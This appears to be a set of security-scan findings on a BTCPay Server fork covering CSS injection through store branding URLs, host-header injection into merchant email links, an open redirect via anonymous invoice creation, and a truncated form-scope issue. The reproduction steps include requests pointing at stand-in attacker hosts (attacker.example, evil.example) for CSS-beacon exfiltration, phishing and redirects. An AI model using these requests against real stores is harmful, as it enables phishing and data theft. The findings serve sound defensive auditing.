**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257445

---

# Store owner's custom CSS/logo URL is loaded into authenticated backend pages of co-members and server admins (cross-principal CSS injection)

## Details
A store's custom CSS URL and logo URL are documented as branding for the public/customer-facing pages only (GeneralSettings.cshtml:64; swagger cssUrl: 'customize the public/customer-facing pages'), and the only backend-related option is labelled 'Apply the brand color to the store's backend as well'. However LayoutHead.cshtml:11-14 builds the StoreBrandingViewModel from the store blob for every backend page that has a store context whenever ApplyBrandColorToBackend is true, and StoreBrandingViewModel.CreateAsync (lines 23-27) copies CssUrl and LogoUrl along with the colour. LayoutHeadStoreBranding.cshtml:113-121 then emits <link rel=stylesheet href=CssUrl> and <link rel=icon href=LogoUrl> on every authenticated page of that store, which _Layout.cshtml:18 includes for the whole backend.

The URLs are controlled by anyone holding btcpay.store.canmodifystoresettings on the store (the Owner role; a custom role; an API key). Greenfield PUT /api/v1/stores/{storeId} accepts any absolute URI for cssUrl/logoUrl (GreenfieldStoresController.cs:348-351) and copies applyBrandColorToBackend verbatim (line 290); through the UI an uploaded .css file is stored verbatim after size/declared-content-type/extension checks and served from /LocalStorage, and the backend toggle only needs a brand colour to be set (UIStoresController.Settings.cs:99). The global CSP (ContentSecurityPolicyAttribute AntiXSS) constrains only script-src, so the cross-origin stylesheet loads and may issue url()/@import/@font-face requests to the attacker's host.

The store context is set for any request whose store-scoped authorization succeeded (SetContextFilter.cs:31-36), so every other principal who opens the store's backend receives the stylesheet: co-owners and lesser-role members, and server administrators, who hold read-only CanViewStoreSettings on every store (BuiltInPermissionHandler.cs:24-26) and reach GET /stores/{id}/settings and the other view pages via UIStoresController's class-level policy.

What the tenant gains beyond the sanctioned public-page CSS: (a) observation of which members/admins visit which backend pages, with IP/UA/timing, including when an admin audits the store; (b) exfiltration via CSS attribute selectors of victim-specific attribute values rendered by the shared layout — the victim's display name and login e-mail in GlobalNav's title attribute (Default.cshtml:126) and the IDs of the victim's other stores in StoreSelector hrefs — data a tenant cannot otherwise obtain for a server admin; (c) content spoofing / UI redress inside the trusted authenticated UI (::before/::after content, overlays, hiding warnings, swapping displayed addresses/amounts on wallet/PSBT review pages) to mislead a co-owner who signs externally, or to present phishing instructions to an admin. Store-scoped secrets (webhook secrets, xpubs) are already available to the attacker as Owner and are not a gain; admins cannot be induced to modify the tenant store because they lack CanModifyStoreSettings. Script execution is not possible (CSP script-src 'self'), so this is CSS injection, not XSS.

A weaker secondary reach is LogoUrl, emitted as <link rel=icon> on the same pages, which alone lets the tenant observe backend visits.

## Evidence
1. [BTCPayServer/Views/Shared/LayoutHead.cshtml:7–14](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/Shared/LayoutHead.cshtml#L7-L14)
   Primary location / fix point. For every backend page with a store context (isBackend = store != null && no public StoreBranding in ViewData), when blob.ApplyBrandColorToBackend is true the layout builds the full StoreBrandingViewModel from the store blob via CreateAsync, so the toggle documented as 'apply the brand color to the backend' also applies the store's CssUrl and LogoUrl to the authenticated UI. _Layout.cshtml:18 includes this partial for every backend page.
2. [BTCPayServer/Models/StoreBrandingViewModel.cs:19–33](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Models/StoreBrandingViewModel.cs#L19-L33)
   CreateAsync copies LogoUrl and CssUrl (resolved through UriResolver: fileid: -> /LocalStorage URL, Raw -> returned verbatim) alongside BrandColor; there is no backend-only variant that carries just the validated hex colour.
3. [BTCPayServer/Views/Shared/LayoutHeadStoreBranding.cshtml:113–120](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/Shared/LayoutHeadStoreBranding.cshtml#L113-L120)
   Emits <link href="@Model.CssUrl" rel="stylesheet"> and <link rel="icon"/"apple-touch-icon" href="@Model.LogoUrl">, so the victim's browser fetches and applies the tenant-controlled stylesheet (and fetches the tenant logo URL) on backend pages.
4. [BTCPayServer/Controllers/GreenField/GreenfieldStoresController.cs:344–351](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/GreenField/GreenfieldStoresController.cs#L344-L351)
   Validate() only requires LogoUrl/CssUrl to parse as an absolute URI (any scheme/host, unlike Website/SupportUrl which are scheme-restricted); ToModel (lines 289-292) stores them via UnresolvedUri.Create and copies ApplyBrandColorToBackend from the request. PUT /api/v1/stores/{id} (CanModifyStoreSettings) with cssUrl=https://attacker/x.css and applyBrandColorToBackend=true is sufficient.
5. [BTCPayServer/Controllers/UIStoresController.Settings.cs:129–156](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIStoresController.Settings.cs#L129-L156)
   UI path: an uploaded CSS file is checked only for size, the client-declared Content-Type and a .css extension, then stored verbatim (storageFileName keeps the .css suffix, StorageExtensions serves /LocalStorage with inferred text/css). Line 99 sets ApplyBrandColorToBackend when the toggle is on and a BrandColor is present — both trivially set by the same owner.
6. [BTCPayServer/Security/SetContextFilter.cs:31–35](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/SetContextFilter.cs#L31-L35)
   The store context read by LayoutHead (GetStoreDataOrNull) is set for any request whose store-scoped authorization succeeded (BuiltInPermissionHandler.StoreKey), i.e. for every member or admin opening any /stores/{id}/... or wallet page of the store.
7. [BTCPayServer/Security/BuiltInPermissionHandler.cs:24–25](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Security/BuiltInPermissionHandler.cs#L24-L25)
   Server admins hold CanViewStoreSettings on every store, and UIStoresController is class-authorized with that policy (UIStoresController.cs:32), so an admin opening GET /stores/{id}/settings (or any view page) of a tenant store receives the tenant's stylesheet. Admins do not get CanModifyStoreSettings on tenant stores, so against admins the impact is observation and content spoofing, not induced store modifications.
8. [BTCPayServer/Components/GlobalNav/Default.cshtml:126](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Components/GlobalNav/Default.cshtml#L126)
   The shared backend layout renders the victim's display name and login name (User.Identity.Name, i.e. e-mail) in a title attribute, and StoreSelector/Default.cshtml renders the victim's other store IDs in hrefs; attribute-selector + url() rules in the injected stylesheet can exfiltrate these values, which a tenant cannot otherwise see for a server admin.
9. [BTCPayServer/Filters/ContentSecurityPolicyAttribute.cs:20–28](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Filters/ContentSecurityPolicyAttribute.cs#L20-L28)
   The globally registered AntiXSS template (Startup.cs:166-167) only sets script-src 'self'; no default-src/style-src/img-src/font-src, so a cross-origin stylesheet is permitted and its url()/@import/@font-face fetches reach attacker hosts from the victim's session.

## Impact
Confidentiality LOW: the stylesheet can report which members/admins view which backend pages (IP/UA/timing) and exfiltrate attribute-held values of the shared layout such as the victim's login e-mail (GlobalNav title attribute) and other store IDs — information the tenant does not otherwise hold for a server admin — but not cookies, text nodes or store data beyond what the Owner already has. Integrity LOW: attacker CSS can spoof or hide content inside other principals' authenticated UI (overlays, ::before/::after text, swapped displayed addresses) to mislead co-owners or admins, but cannot itself submit or alter requests, and admins lack CanModifyStoreSettings on the tenant store. Availability NONE: hiding the store UI is recoverable via the Greenfield API by any owner.

## Reproduction steps
1. Attacker: a store Owner (or any holder of btcpay.store.canmodifystoresettings; self-registered users own their own stores). Step 1: PUT /api/v1/stores/{id} with {"cssUrl":"https://attacker.example/x.css","brandColor":"#000000","applyBrandColorToBackend":true} (or upload a .css file and tick the backend toggle in General Settings). Step 2: wait for a co-member or a server admin to open any backend page of that store (GET /stores/{id}/settings, invoices, wallet pages). Their browser loads and applies the attacker's stylesheet; the global CSP has no style-src/img-src/font-src so beacons fire. Only passive browsing by the victim is required for observation/exfiltration and content spoofing; no deployment condition is involved. Assumes browsers apply cross-origin stylesheets served with text/css (attacker-controlled server) and that ASP.NET Core's FileVersionProvider leaves absolute URLs untouched under asp-append-version.

## Recommended fix
1. LayoutHead.cshtml and StoreBrandingViewModel.CreateAsync apply the store's CssUrl and LogoUrl to authenticated backend pages whenever ApplyBrandColorToBackend is set, although the option is documented and labelled as applying only the brand colour; tenant-controlled stylesheets therefore load in the sessions of co-members and server admins. Fix criteria: Backend (authenticated) pages must never load a store-controlled stylesheet or remote logo URL: with ApplyBrandColorToBackend enabled only the validated hex colour is applied. Verify by setting cssUrl/logoUrl on a store, enabling the backend toggle, and confirming that no <link rel=stylesheet> or <link rel=icon> pointing at the store's URL appears in the HTML of any /stores/{id}/* or wallet page for members or admins.
2. Greenfield accepts any absolute URI for cssUrl/logoUrl/paymentSoundUrl and no CSP style-src/img-src/font-src directive limits where stylesheets and their sub-resources may be loaded from, so tenant branding can beacon to arbitrary hosts. Fix criteria: Restrict branding URLs to https (or fileid: references) and, on pages that legitimately carry store branding, emit a CSP that permits styles, images and fonts only from 'self' plus the explicitly configured branding origin. Verify that PUT /api/v1/stores with a javascript:, data: or http: cssUrl is rejected and that branded responses carry a restrictive style-src.

---
**Severity:** LOW
**Status:** Open
**Category:** CSS injection
**CWE:** [CWE-829](https://cwe.mitre.org/data/definitions/829.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** NONE
**Privileges required:** LOW
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257444

---

# Anonymous payer's forwarded Host becomes the {Invoice.Link} URL in merchant email notifications

## Details
Every public invoice-creation flow (PoS POST /apps/{appId}/pos, Crowdfund, Forms, LNURL, Pay Button, paying a payment request) passes Request.GetAbsoluteRoot() to UIInvoiceController.CreateInvoiceCoreRaw, which persists it as InvoiceEntity.ServerUrl. Request.Host/Scheme are rewritten from X-Forwarded-Host/X-Forwarded-Proto supplied by any peer, because Startup.cs registers ForwardedHeaders.All with KnownProxies and KnownIPNetworks cleared (and no AllowedHosts restriction), so an anonymous payer adding `X-Forwarded-Host: attacker.example` to the PoS POST makes the stored base URL https://attacker.example.

When any invoice webhook event fires, InvoiceTriggerProvider.AddInvoiceToModel builds Invoice.Link = linkGenerator.InvoiceLink(id, invoice.GetRequestBaseUrl()) — i.e. https://attacker.example/invoices/<invoiceId> — and, for refunds, PullPayment.Link the same way. StoreEmailRuleProcessorSender renders the merchant's email-rule body with HtmlEncoder (URL characters survive) and sends it as an HTML email. Merchants are told {Invoice.Link} is 'The backend link to the invoice'; the UI prefills a new rule's body from the trigger's DefaultEmail, and the default 'Invoice - Expired Paid Partial' body already ends with 'Please review and take appropriate action: {Invoice.Link}'. The merchant thus receives a genuine notification from their own store (correct invoice id, order id, amounts) whose review link lands on an attacker site that can mirror the BTCPay login page to harvest the merchant's or admin's credentials or 2FA codes. The attacker triggers the events at will: creating the invoice fires InvoiceCreated, paying part and letting it expire fires InvoiceExpiredPaidPartial; a merchant-issued refund fires InvoiceRefund whose PullPayment.Link (sent to the customer address and any merchant CC) is likewise attacker-hosted.

The operator-configured ServerSettings.BaseUrl (Server Settings → Branding; consulted by CallbackGenerator and exposed as {Server.BaseUrl}) is the trusted source for link hosts, but this path never consults it, so the issue holds on fully configured deployments. Victim-side precondition outside the attacker's control: the store has an invoice email rule rendering {Invoice.Link} or {PullPayment.Link}. Assumptions: ASP.NET Core ForwardedHeadersMiddleware (net10.0 shared framework) applies X-Forwarded-Host from any remote when no known proxies/networks are configured and AllowedHosts is empty (consistent with the scan's established fact), and the fronting reverse proxy passes client X-Forwarded-Host through (nginx forwards unknown request headers unless overridden).

## Evidence
1. [BTCPayServer/Plugins/Webhooks/TriggerProviders/InvoiceTriggerProvider.cs:58–79](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/TriggerProviders/InvoiceTriggerProvider.cs#L58-L79)
   AddInvoiceToModel sets Invoice.Link = linkGenerator.InvoiceLink(invoice.Id, invoice.GetRequestBaseUrl()) — the merchant-facing backend link is built on the base URL stored with the invoice (payer's request), not on the configured ServerSettings.BaseUrl.
2. [BTCPayServer/Plugins/Webhooks/TriggerProviders/InvoiceTriggerProvider.cs:33–43](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/TriggerProviders/InvoiceTriggerProvider.cs#L33-L43)
   The refund model's PullPayment.Link is built the same way from invoice.GetRequestBaseUrl().
3. [BTCPayServer/Controllers/UIInvoiceController.cs:162–166](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.cs#L162-L166)
   CreateInvoiceCoreRaw stores the caller-supplied serverUrl as entity.ServerUrl, which InvoiceEntity.GetRequestBaseUrl() (InvoiceEntity.cs:779) later parses via RequestBaseUrl.FromUrl.
4. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:186–192](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L186-L192)
   The PoS checkout POST is reachable anonymously ([HttpPost], [IgnoreAntiforgeryToken], [EnableCors], no [Authorize]).
5. [BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs:395–420](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/PointOfSale/Controllers/UIPointOfSaleController.cs#L395-L420)
   The anonymous PoS checkout passes HttpContext.Request.GetAbsoluteRoot() (scheme://host[pathbase] of the payer's request) as serverUrl; Crowdfund (UICrowdfundController.cs:212), Forms (UIFormsController.cs:208), LNURL (UILNURLController.cs:619), Pay Button (UIPublicPayButtonController.cs:69) and payment-request payment (UIInvoiceController.cs:158) do the same.
6. [BTCPayServer/Hosting/Startup.cs:325–332](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Hosting/Startup.cs#L325-L332)
   ForwardedHeaders.All with KnownIPNetworks/KnownProxies cleared: any client's X-Forwarded-Host/X-Forwarded-Proto rewrites Request.Host/Scheme, which GetAbsoluteRoot() reads.
7. [BTCPayServer/Plugins/Emails/HostedServices/EmailRuleProcessorSender.cs:74–90](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Emails/HostedServices/EmailRuleProcessorSender.cs#L74-L90)
   Store email rules render the model into the body with HtmlEncoder (a URL survives intact) and send it to the rule's recipients — typically the merchant; EmailSender.SendEmail (EmailSender.cs:33) builds the message with isHtml: true.
8. [BTCPayServer/Plugins/Webhooks/WebhooksPlugin.cs:365–373](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Webhooks/WebhooksPlugin.cs#L365-L373)
   The default body for 'Invoice - Expired Paid Partial' embeds {Invoice.Link} ('Please review and take appropriate action'); EmailRulesManage.cshtml:165-169 prefills a new rule from this DefaultEmail, and InvoiceTriggerProvider.cs:88 documents {Invoice.Link} as 'The backend link to the invoice'.
9. [BTCPayServer/Services/CallbackGenerator.cs:34–44](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/CallbackGenerator.cs#L34-L44)
   The project already has a trusted source for link hosts — the operator-configured ServerSettings.BaseUrl, preferred here over the request — which the invoice-link path does not use.

## Impact
A phishing primitive against merchants and server admins: the 'backend link' in a legitimate store notification points at an attacker host, which can mirror the login page to harvest credentials/2FA codes (confidentiality) and misrepresent the invoice's backend state to the merchant (integrity of communications). No direct effect on the server itself, and no secret token travels in the link, so both rated LOW; availability unaffected.

## Reproduction steps
1. Attacker: anonymous payer (threat-model adversary 5, whose named aim includes injecting content shown to merchants). They POST to a public PoS/crowdfund/form/pay-button endpoint with X-Forwarded-Host: attacker.example (optionally paying partially and letting the invoice expire to fire the trigger whose default body carries the link). The merchant's email rule renders {Invoice.Link} on attacker.example; the merchant, trusting a notification carrying their own invoice data, clicks and interacts with the phishing page (UI:ACTIVE). AT:PRESENT for the victim-side configuration the attacker cannot control: the store must have an invoice email rule rendering {Invoice.Link}/{PullPayment.Link} (prefilled for one trigger). The shipped control for link hosts — the configured ServerSettings.BaseUrl — is bypassed because this path never consults it. Dependency assumption: ASP.NET Core ForwardedHeadersMiddleware (net10.0) honours X-Forwarded-Host from any peer when KnownProxies/KnownIPNetworks are empty and AllowedHosts is unset.

## Recommended fix
1. Merchant-facing backend links ({Invoice.Link}, {PullPayment.Link}) are generated from the base URL captured from the payer-controlled invoice-creation request (InvoiceEntity.ServerUrl) instead of from the operator-configured ServerSettings.BaseUrl that CallbackGenerator already prefers. Fix criteria: Links intended for merchants/admins in email models are built from the configured ServerSettings.BaseUrl (falling back to the request only when none is configured), never from the invoice's stored request URL. Verify: an invoice created through PoS with X-Forwarded-Host: evil.test produces an email whose Invoice.Link and PullPayment.Link hosts are the configured BaseUrl, not evil.test.
2. ForwardedHeadersOptions is registered with ForwardedHeaders.All and KnownProxies/KnownIPNetworks cleared, so X-Forwarded-Host/X-Forwarded-Proto from any peer rewrite Request.Host and Request.Scheme. Fix criteria: Forwarded headers are honoured only from configured reverse-proxy addresses/networks (or X-Forwarded-Host is excluded / constrained by AllowedHosts), so a direct client or a pass-through header cannot change the host the application derives URLs from. Verify: a request carrying X-Forwarded-Host from a non-proxy peer leaves Request.Host equal to the connection's Host header.

---
**Severity:** LOW
**Status:** Open
**Category:** Host header injection
**CWE:** [CWE-348](https://cwe.mitre.org/data/definitions/348.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** ACTIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257442

---

# Anonymous Bitpay invoice creation stores attacker redirectURL enabling open redirect from BTCPay domain

## Details
BitpayInvoiceController.CreateInvoiceCoreRaw (BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:167-170) sets `entity.RedirectURLTemplate = invoice.RedirectURL ?? store.StoreWebsite` and `entity.RedirectAutomatically = invoice.RedirectAutomatically.GetValueOrDefault(storeBlob.RedirectAutomatically)` straight from the request body, for every Bitpay identity alike. A request to POST /invoices?storeId=<id> with Content-Type application/json and no x-signature header is routed to this controller because the storeid query key flips BitpayEndpointSelectorPolicy (BitpayEndpointSelectorPolicy.cs:37-48), is authenticated as Bitpay.Anonymous (BitpayAuthenticationHandler.cs:50-53), and is granted CanCreateInvoice when the store blob has AnyoneCanInvoice (BitpayAuthorizationHandler.cs:31-59) - the flag the Pay Button feature enables (UIPayButtonController.cs:82) and that is also a toggle in store General Settings and Greenfield (AnyoneCanCreateInvoice). The project's own test BitpayTests.CanUseAnyoneCanCreateInvoice exercises exactly this anonymous 200. InvoiceEntity.RedirectURL (InvoiceEntity.cs:496-505) only requires an absolute http/https URI, so any external host is stored.

The stored URL is then followed from the merchant's BTCPay domain by anonymous pages (reachable for a month after monitoring expiry, UIInvoiceController.UI.cs:1343):
- Store with receipts disabled (ReceiptOptions default Enabled=true): GET /i/{id}/receipt answers with a server-side 302 to invoice.RedirectURL (UIInvoiceController.UI.cs:211-216); GET /i/{id} does the same when no checkout model can be built, e.g. a zero-price invoice on a store with AllowZeroAmountInvoices (UIInvoiceController.UI.cs:752-765, UIInvoiceController.cs:234,245).
- Default configuration: the checkout page shows the URL as the merchant's own 'Return to <StoreName>' button (MerchantRefLink, UIInvoiceController.UI.cs:927; checkout.js:186-190; Checkout.cshtml:148,182,219) and navigates window.top.location there after settlement when redirectAutomatically is set (checkout.js:234-242) - a flag the anonymous Bitpay body sets directly, unlike the PoS path which depends on the store setting; the receipt page renders it as 'Return to <StoreName>' (InvoiceReceipt.cshtml:192-194).

Attack: an unauthenticated attacker POSTs `/invoices?storeId=<id>` with `{"price":1,"currency":"USD","redirectURL":"https://evil.example/","redirectAutomatically":true}` to any store that has the Pay Button (AnyoneCanInvoice) enabled, reads the invoice id from the response, and distributes `https://<merchant-btcpay>/i/<id>` or `/i/<id>/receipt`. Victims who trust the merchant's payment domain are 302'd to attacker content or shown it as the merchant's own return link (fake 'payment failed, retry here' pages, wallet/credential phishing). The same body may also set notificationURL, posData, orderId and buyer fields.

This is a sibling of the verified finding pos-payer-controlled-redirecturl-open-redirect (anonymous redirectUrl on the public PoS/crowdfund POST): same sink, different anonymous entry point with its own fix site. For BitId-paired merchants, choosing redirectURL is the intended legacy API behaviour; the defect is that the anonymous AnyoneCanInvoice opt-in - which the Pay Button Enable page describes only as letting 'anyone create an invoice' whose 'order relevant information can be modified by the user' - inherits the merchant's ability to point the merchant's own domain at arbitrary external hosts.

## Evidence
1. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:167–169](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L167-L169)
   CreateInvoiceCoreRaw copies the request body's redirectURL into entity.RedirectURLTemplate (taking precedence over store.StoreWebsite) and redirectAutomatically into entity.RedirectAutomatically with no host validation and no distinction between a BitId-paired merchant and the Bitpay.Anonymous identity.
2. [BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs:50–64](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Controllers/BitpayInvoiceController.cs#L50-L64)
   POST /invoices ([MediaTypeConstraint(application/json)], [Authorize(CanCreateInvoice, Bitpay scheme)]) accepts the Anonymous identity; the only extra gate for it is the PublicInvoices throttle (4 r/min per RemoteIpAddress), which does not stop a single creation.
3. [BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs:31–58](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Security/BitpayAuthorizationHandler.cs#L31-L58)
   For the Anonymous identity the store is resolved from the ?storeId= query string and CanCreateInvoice succeeds whenever store blob AnyoneCanInvoice is true (the flag the Pay Button feature sets, UIPayButtonController.cs:82; also exposed in store General Settings and Greenfield AnyoneCanCreateInvoice). Test BitpayTests.CanUseAnyoneCanCreateInvoice confirms the anonymous 200.
4. [BTCPayServer/Plugins/Bitpay/Security/BitpayAuthenticationHandler.cs:50–52](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/Security/BitpayAuthenticationHandler.cs#L50-L52)
   Any request without x-identity/x-signature headers is authenticated as BitpayAuthenticationTypes.Anonymous, so no credential is needed.
5. [BTCPayServer/Plugins/Bitpay/BitpayEndpointSelectorPolicy.cs:36–47](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Plugins/Bitpay/BitpayEndpointSelectorPolicy.cs#L36-L47)
   The presence of a storeid query key routes POST /invoices with a JSON body to the Bitpay controller instead of the cookie-authenticated UI action, so the anonymous path is selectable by the caller.
6. [BTCPayServer/Services/Invoices/InvoiceEntity.cs:496–504](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Services/Invoices/InvoiceEntity.cs#L496-L504)
   InvoiceEntity.RedirectURL accepts any absolute http/https URI; only the scheme is checked, so any external host passes.
7. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:211–215](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L211-L215)
   Anonymous GET /i/{invoiceId}/receipt returns a server-side Redirect(i.RedirectURL) when receipts are disabled for the store; ValidateAccessToInvoice (line 1343) allows anonymous access for a month past monitoring expiry.
8. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:752–764](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L752-L764)
   Anonymous GET /i/{invoiceId} 302s to the stored URL when no checkout model can be built (e.g. a zero-price Standard invoice on a store with AllowZeroAmountInvoices, UIInvoiceController.cs:234,245) and receipts are disabled.
9. [BTCPayServer/Controllers/UIInvoiceController.UI.cs:927–929](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Controllers/UIInvoiceController.UI.cs#L927-L929)
   Default configuration: the checkout model exposes the stored URL as MerchantRefLink and the attacker-set RedirectAutomatically flag to the checkout page.
10. [BTCPayServer/wwwroot/checkout/checkout.js:186–189](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/wwwroot/checkout/checkout.js#L186-L189)
   merchantRefLink becomes storeLink, rendered as the 'Return to <StoreName>' button on the trusted checkout page (Checkout.cshtml:148,182,219) and, when redirectAutomatically is set (attacker-controlled via the Bitpay body), used for window.top.location after settlement (lines 234-242).
11. [BTCPayServer/Views/UIInvoice/InvoiceReceipt.cshtml:192–194](https://github.com/Halbarevi/btcpayserver/blob/165bbbd3d1a2cfe1d463407b1fc172edb90c0586/BTCPayServer/Views/UIInvoice/InvoiceReceipt.cshtml#L192-L194)
   Receipt page (default enabled) renders the stored URL as the 'Return to <StoreName>' link on the BTCPay domain.

## Impact
Trust in the merchant's payment domain is abused to send users to attacker content (phishing, fake payment pages impersonating the merchant or BTCPay); no server data is read or modified beyond the attacker's own invoice's redirect field.

## Reproduction steps
1. Unauthenticated network attacker; the target store must have AnyoneCanInvoice enabled (set by the Pay Button feature, a store General Settings toggle or Greenfield), and the server-side 302 additionally needs receipts disabled - non-default store configuration, hence AT:PRESENT. One anonymous POST /invoices?storeId=<id> with a JSON body (rate limit 4/min does not prevent it) yields the invoice id; the victim only has to open a link on the merchant's trusted domain, which 302s them or presents the attacker URL as the merchant's own return button / automatic post-payment redirect.

## Recommended fix
The legacy Bitpay invoice-creation endpoint persists the caller-supplied redirectURL and redirectAutomatically for the Bitpay.Anonymous identity (AnyoneCanInvoice stores) exactly as it does for BitId-paired merchants, and the checkout/receipt pages follow the stored URL from the trusted domain with only an http/https scheme check. Fix criteria: Invoices created by a Bitpay.Anonymous identity must not carry a caller-chosen external redirect: ignore redirectURL/redirectAutomatically for anonymous callers (fall back to the store website / store setting) or restrict them to destinations the merchant controls (same origin as StoreWebsite or the BTCPay origin). Verify that an anonymous POST /invoices?storeId=<id> with redirectURL=https://evil.example yields an invoice whose /i/{id}, /i/{id}/receipt, checkout 'Return to store' link and post-payment redirect never reference evil.example.

---
**Severity:** LOW
**Status:** Open
**Category:** Open redirect
**CWE:** [CWE-601](https://cwe.mitre.org/data/definitions/601.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/btcpayserver
**Branch:** main
**Commit:** 165bbbd3d1a2cfe1d463407b1fc172edb90c0586
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01T8kzaYNjL5FRBR7tZd6bAT&finding=scan_01PpWUp1JYcSoiTiFe8zzgGU-5257438

---

# Payment request FormId resolved without store scope exposes other stores' non-public forms

## Details
Forms are store-owned settings objects (edited under CanModifyStoreSettings, listed per store by FormDataService.GetForms(storeId)). Their Public flag is 'standalone mode' (Modify.cshtml: 'Standalone mode, which can be used to generate invoices independent of payment requests or apps'); UIFormsController.ViewPublicForm / SubmitForm (GET/POST /forms/{formId}) return 404 for a non-public form unless the caller holds CanViewStoreSettings on the owning store. The payment-request feature re-implements form rendering but resolves the id with the store-unscoped FormDataService.GetForm(id) and never checks formData.StoreId against the payment request's store or the Public flag.

